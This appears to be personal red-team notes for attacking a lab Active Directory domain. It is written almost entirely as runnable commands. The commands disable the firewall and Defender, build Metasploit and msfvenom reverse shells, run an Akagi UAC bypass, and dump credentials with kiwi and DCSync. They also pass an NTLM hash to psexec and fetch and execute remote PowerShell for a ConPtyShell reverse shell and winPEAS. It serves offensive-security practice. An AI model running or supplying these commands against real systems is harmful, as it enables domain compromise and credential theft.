# set uac
```
set uac to default
```

# disable firewall
```
netsh advfirewall set allprofiles state off
```

# disable antivirus
```
login as Administrator, and disable all antivirus in settings and then
cd Desktop
wget https://github.com/pgkt04/defender-control/releases/download/v1.5/disable-defender.exe -o uwu.exe
.\uwu.exe
```

# on kali
```
git clone https://github.com/fortra/impacket.git
pip install impacket --break-system-packages
pip install -r ./requirements.txt --break-system-packages

uwu.zip
```

### PATH
ludus\domainmember > ludus\domainadmin > dump creds > ludus\domainadmin > Administrator

### win11 ludus\domainmember

```
vim user_handler.rc
use exploit/multi/script/web_delivery
set target PSH\ (Binary)
set PAYLOAD windows/x64/meterpreter/reverse_https
set LHOST 10.5.30.50
set PSH-EncodedCommand false
exploit -j

msfconsole -r user_handler.rc
# windows run command on win11
sessions
sessions 1
```

there will be badly set up service running as domain admin



### win11 ludus\domainadmin
```
net localgroup administrators
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.5.30.50 LPORT=1234 -f exe > rev_shell.exe

cd %TEMP%
upload Akagi64.exe Akagi.exe
upload rev_shell.exe rev_shell.exe
shell
.\Akagi.exe 33 "C:\Users\domainadmin\AppData\Local\Temp\rev_shell.exe"

load kiwi
creds_all
hashdump
dcsync_lsa krbtgt

python3 ~/Desktop/tools/impacket/examples/psexec.py 'domainadmin@10.5.20.13' -hashes :8846f7eaee8fb117ad06bdd830b7586c
psexec \\10.5.20.13 -i -u ludus\domainadmin -p password cmd.exe
```

wget https://github.com/ParrotSec/mimikatz/blob/master/x64/mimikatz.exe 
wget https://github.com/peass-ng/PEASS-ng/releases/download/20250401-a1b119bc/winPEASx64.exe

!todo add exfiltration


```
vim admin_handler.rc
use multi/handler
set payload windows/x64/meterpreter/reverse_tcp 
set LHOST 10.5.30.50
set LPORT 1234
run


msfconsole -r admin_handler.rc
```

### server ludus\domainadmin
!persistence + exfiltration


# raw shell
```
stty raw -echo; (stty size; cat) | nc -lvnp 1337
IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 10.5.30.50 1337
```

powerview
https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993

adpeas
https://github.com/61106960/adPEAS

winpeas
powershell "IEX(New-Object Net.WebClient).downloadString('https://raw.githubusercontent.com/peass-ng/PEASS-ng/master/winPEAS/winPEASps1/winPEAS.ps1')"
https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS


https://www.microsoft.com/en-us/download/details.aspx?id=104003
group policy management editor > computer configuration > policies > administrative templates > windows components > microsfot defender antivirus